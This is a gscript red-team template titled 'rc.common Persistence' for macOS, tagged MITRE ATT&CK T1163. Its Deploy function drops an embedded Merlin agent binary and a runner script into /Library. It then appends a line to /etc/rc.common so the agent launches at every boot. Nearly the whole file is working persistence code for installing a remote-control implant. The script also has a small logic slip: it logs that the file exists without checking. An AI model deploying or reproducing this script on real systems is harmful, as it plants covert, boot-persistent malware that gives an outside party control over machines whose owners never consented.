// Example gscript template
// Title: RC.Commong Persistence 
// Author: ahhh
// Purpose: rc.common Persistence
// Gscript version: 0.1.2
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1163

//priority:150
//timeout:150

//import:/private/tmp/merlinagent.macho
//import:/private/tmp/merlin_osx_runner.sh

function BeforeDeploy() {
  LogInfo("Starting rc.common persistence");
  return true; 
}

function Deploy() {  
  // drop the agent
  var merlin = Asset("merlinagent.macho");
  var fn = "/Library/merlin";
  WriteFile(fn, merlin.fileData, 0755);
  LogInfo("dropped a merlin agent");

  // Drop the runner script
  var script = Asset("merlin_osx_runner.sh");
  var fn2 = "/Library/runner";
  WriteFile(fn2, script.fileData, 0755);
  LogInfo("dropped the runner script");

  // Set the rc.common persistence
  var file_location = "/etc/rc.common";
  LogInfo("File Location: "+ file_location);
  var rc_common_bytes = StringToByteArray("sh "+ fn2);
  var does = FileExists(file_location);
  LogInfo("file already exists, so appending");
  var obj = AppendFileBytes(file_location, rc_common_bytes);
  LogInfo(obj.fileError);
  return true;
}

function AfterDeploy() {
  LogInfo("Done rc.common persistence");
  return true;
}
